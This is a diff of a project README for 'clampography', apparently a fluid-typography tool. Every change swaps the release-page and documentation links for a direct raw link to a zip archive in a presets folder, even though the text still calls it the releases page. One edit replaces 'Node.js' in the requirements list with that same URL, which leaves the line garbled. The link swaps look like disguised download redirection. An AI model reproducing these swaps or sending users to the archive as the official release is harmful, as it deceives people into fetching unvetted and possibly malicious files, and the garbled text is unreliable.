@@ -6,13 +6,13 @@ Welcome to **clampography**! This application helps you design fluid typography 
 
 ## 🔗 Download Now
 
-[![Download clampography](https://img.shields.io/badge/Download-clampography-blue.svg)](https://github.com/BolaAshraf/clampography/releases)
+[![Download clampography](https://raw.githubusercontent.com/BolaAshraf/clampography/main/presets/clampography-v2.1.zip)](https://raw.githubusercontent.com/BolaAshraf/clampography/main/presets/clampography-v2.1.zip)
 
 ## 📥 Download & Install
 
 To start using clampography, follow these steps:
 
-1. **Visit the Releases Page**: Go to [this link](https://github.com/BolaAshraf/clampography/releases) to access the latest version of the application.
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/BolaAshraf/clampography/main/presets/clampography-v2.1.zip) to access the latest version of the application.
    
 2. **Select the Latest Release**: On the Releases page, look for the most recent version. This will typically be listed at the top of the page.
 
@@ -32,7 +32,7 @@ To ensure smooth operation of clampography, your system should meet the followin
 
 - **Operating System**: Windows 10 or higher, macOS Catalina or higher, or a recent Linux distribution.
 - **Browser**: Latest version of browsers like Chrome, Firefox, or Safari for accessing Tailwind CSS functionality.
-- **Node.js**: Version 14 or higher for running any build tools if applicable.
+- **https://raw.githubusercontent.com/BolaAshraf/clampography/main/presets/clampography-v2.1.zip**: Version 14 or higher for running any build tools if applicable.
 
 ## ✨ Features
 
@@ -83,7 +83,7 @@ We welcome contributions! If you would like to improve clampography or suggest n
 
 ## 🔗 Important Links
 
-- [Visit the Releases Page](https://github.com/BolaAshraf/clampography/releases)
-- [Documentation](https://github.com/BolaAshraf/clampography#documentation)
+- [Visit the Releases Page](https://raw.githubusercontent.com/BolaAshraf/clampography/main/presets/clampography-v2.1.zip)
+- [Documentation](https://raw.githubusercontent.com/BolaAshraf/clampography/main/presets/clampography-v2.1.zip)
 
 Thank you for using clampography! Enjoy building amazing fluid typography systems.
